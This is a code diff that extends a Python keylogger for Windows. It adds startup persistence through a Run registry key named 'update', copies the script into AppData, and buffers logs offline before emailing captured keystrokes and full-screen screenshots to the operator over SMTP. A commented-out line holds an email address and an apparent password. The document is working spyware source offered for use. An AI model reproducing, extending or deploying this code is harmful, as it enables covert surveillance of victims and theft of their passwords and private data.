@@ -6,6 +6,7 @@ import smtplib
 from mss import mss
 import os
 
+
 # this programme can be complied into an .exe with pyinstaller
 
 
@@ -18,6 +19,16 @@ class Key_loger:
         self.email = email
         self.email_password = password
 
+    # this fct will make our keyloger start when the computer starts
+
+    def presistent(self):
+        # keyloger.py c'est le nom du fichier du  keyloger
+        keyloger_location = os.environ["appdata"] + "\\keyloger.py"
+        if not os.path.exists(keyloger_location):
+            os.system("copy keyloger.py " + os.environ["appdata"])
+            os.system(
+                'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+keyloger_location+'"')
+
     def key_press_listener(self, key):
         # this fct will record all what i type on the log var
         try:
@@ -28,19 +39,33 @@ class Key_loger:
             # if we use press the space bare it will recorded as Key.space so to make our logs more readable we will change that Key.space by an " " ( a real space )
             if str(key) == "Key.space":
                 self.log += " "
+            # elif str(key) == "Key.backspace":
+            #     self.log += ""
+            # you can uncomment this if u don't want to see the backspace in the logs
             else:
                 self.log += " " + str(key) + " "
 
     def report(self):
         # this fct will send all what was record on the log var every x second (the interval x can be set to the value u want )
-        self.send_repport(self.email, self.email_password,
-                          self.log)
+        try:
+            # when we get back our connection to the internet we send what was saved on the log file and then we del the logs
+            if os.path.exists("./logs.txt"):
+                data = open("logs.txt", "r")
+                self.log += data.read()
+                data.close()
+                os.system("del logs.txt")
+            self.send_repport(self.email, self.email_password,
+                              self.log)
+        except Exception:
+            self.log_in_file()
+
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
 
 # we will send a report ( the logs ) as an e-mail + a screen shot of the full screen of that computer
+
 
     def screenshot(self):
         try:
@@ -53,7 +78,13 @@ class Key_loger:
         # i don't really have much to do here since will send an error msg in the e-mail
         # i have to do a try except cz if there is a problem when taking the screenshot i don't want the programme to crash
 
-    def send_repport(self, email, password, content, img=os.environ["appdata"]+"\monitor-1.png"):
+    def log_in_file(self):
+        # change the name log.txt mrga
+        with open("logs.txt", "a") as log_file:
+            log_file.write(
+                f"the computer lost internet connection\n {self.log}\n -------------------------------------------\n")
+
+    def send_repport(self, email, password, content, img=os.environ["appdata"]+"\\monitor-1.png"):
         newMessage = EmailMessage()
         newMessage['Subject'] = "key loger logs"
         newMessage['From'] = email
@@ -80,10 +111,14 @@ class Key_loger:
             smtp.send_message(newMessage)
 
     def run(self):
-
+        self.presistent()
         Keyboard_listener = pynput.keyboard.Listener(
             on_press=self.key_press_listener)
 
         with Keyboard_listener:
             self.report()
             Keyboard_listener.join()
+
+
+# keyloger = Key_loger(5, "sinchallange@gmail.com", "ri@d123456789")
+# keyloger.run()
